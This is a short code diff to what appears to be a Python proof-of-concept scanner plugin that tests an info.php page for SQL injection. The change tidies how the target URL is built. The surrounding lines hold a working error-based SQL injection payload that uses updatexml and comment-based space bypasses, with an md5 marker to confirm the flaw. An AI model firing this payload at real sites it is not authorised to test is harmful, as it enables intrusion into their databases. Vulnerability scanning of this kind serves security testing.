@@ -47,8 +47,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            url = '{target}'.format(target=self.target) + \
-                "/info.php?fid=1&tblprefix=cms_msession"
+            url =self.target + "/info.php?fid=1&tblprefix=cms_msession"
             payload = "/**/where/**/1/**/and/**/updatexml(1,concat(0x37,(select/**/md5(520)/**/limit/**/0,1)),1)%23"
             geturl = url + payload
             code, head, body, errcode, final_url = hh.http(
